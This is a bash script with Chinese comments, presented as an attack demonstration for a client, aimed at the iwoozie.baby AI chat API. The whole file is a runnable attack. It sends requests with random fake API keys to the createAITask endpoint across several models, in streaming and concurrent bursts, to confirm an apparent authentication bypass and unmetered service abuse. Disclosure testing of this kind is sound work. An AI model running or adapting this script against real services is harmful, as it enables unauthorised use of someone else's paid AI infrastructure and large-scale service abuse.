#!/bin/bash
# iwoozie.baby AI聊天系统 - 简化攻击演示脚本
# 用于向甲方展示系统漏洞的严重性

echo "🔓 iwoozie.baby AI聊天系统 - 攻击演示脚本"
echo "=============================================="
echo "⚠️  警告: 此演示仅用于安全测试目的"
echo "⚠️  请勿用于恶意攻击或非法活动"
echo "=============================================="
echo

# 计数器
successful_attacks=0
failed_attacks=0

# 攻击函数
attack_api() {
    local attack_id=$1
    local model=$2
    local token="fake_token_$((RANDOM % 10000))"
    
    echo "🎯 攻击 #$attack_id - 模型: $model"
    
    response=$(curl -s -X POST "https://iwoozie.baby/api/quick/createAITask?model=$model" \
        -H "Content-Type: application/json" \
        -H "x-api-key: $token" \
        -d '{"Content": [{"role": "user", "content": "Attack #'$attack_id': Generate content for security testing"}]}' \
        --max-time 10)
    
    if echo "$response" | grep -q '"code":200'; then
        echo "  ✅ 攻击成功"
        ((successful_attacks++))
    else
        echo "  ❌ 攻击失败"
        echo "  📄 响应: $(echo "$response" | head -c 100)..."
        ((failed_attacks++))
    fi
    echo
}

# 流式攻击函数
stream_attack() {
    local attack_id=$1
    local token="fake_token_$((RANDOM % 10000))"
    
    echo "🌊 流式攻击 #$attack_id"
    
    response=$(curl -s -X POST "https://iwoozie.baby/api/quick/createAITask?model=GPT-4&stream=true" \
        -H "Content-Type: application/json" \
        -H "x-api-key: $token" \
        -d '{"Content": [{"role": "user", "content": "Stream attack #'$attack_id': Generate a long response"}]}' \
        --max-time 15 | head -5)
    
    if echo "$response" | grep -q "data:"; then
        echo "  ✅ 流式攻击成功"
        echo "  📄 数据流:"
        echo "$response" | head -3 | sed 's/^/    /'
        ((successful_attacks++))
    else
        echo "  ❌ 流式攻击失败"
        ((failed_attacks++))
    fi
    echo
}

# 多模型攻击函数
multi_model_attack() {
    local attack_id=$1
    local models=("GPT-4" "Gemini-2.5-Pro" "Grok-4-Fast")
    
    echo "🎯 多模型攻击 #$attack_id"
    
    for model in "${models[@]}"; do
        attack_api "$attack_id-$model" "$model"
        sleep 0.5
    done
}

# 执行攻击演示
echo "🚀 开始攻击演示..."
echo

# 1. 基本攻击测试
echo "📋 测试1: 基本攻击测试 (5次攻击)"
echo "----------------------------------------"
for i in {1..5}; do
    attack_api "$i" "GPT-4"
    sleep 0.5
done

# 2. 多模型攻击测试
echo "📋 测试2: 多模型攻击测试 (2轮)"
echo "----------------------------------------"
for i in {1..2}; do
    multi_model_attack "$i"
done

# 3. 流式攻击测试
echo "📋 测试3: 流式攻击测试 (2次攻击)"
echo "----------------------------------------"
for i in {1..2}; do
    stream_attack "$i"
done

# 4. 并发攻击测试
echo "📋 测试4: 并发攻击测试 (5次并发攻击)"
echo "----------------------------------------"
for i in {1..5}; do
    attack_api "$i" "GPT-4" &
done
wait

# 统计结果
echo "=============================================="
echo "📊 攻击结果统计"
echo "=============================================="
echo "总攻击次数: $((successful_attacks + failed_attacks))"
echo "成功攻击: $successful_attacks"
echo "失败攻击: $failed_attacks"

if [ $((successful_attacks + failed_attacks)) -gt 0 ]; then
    success_rate=$((successful_attacks * 100 / (successful_attacks + failed_attacks)))
    echo "成功率: $success_rate%"
    
    if [ $success_rate -gt 50 ]; then
        echo
        echo "🚨 严重安全漏洞确认!"
        echo "系统存在严重的安全问题，攻击者可以:"
        echo "1. 绕过前端验证系统"
        echo "2. 无限制访问AI服务"
        echo "3. 进行大规模服务滥用"
        echo "4. 获取敏感AI响应数据"
        echo
        echo "建议立即修复此漏洞!"
    else
        echo
        echo "✅ 系统安全状况良好"
        echo "大部分攻击被成功阻止"
    fi
else
    echo "❌ 无法执行攻击测试"
fi

echo
echo "=============================================="
echo "演示完成 - $(date)"
echo "=============================================="
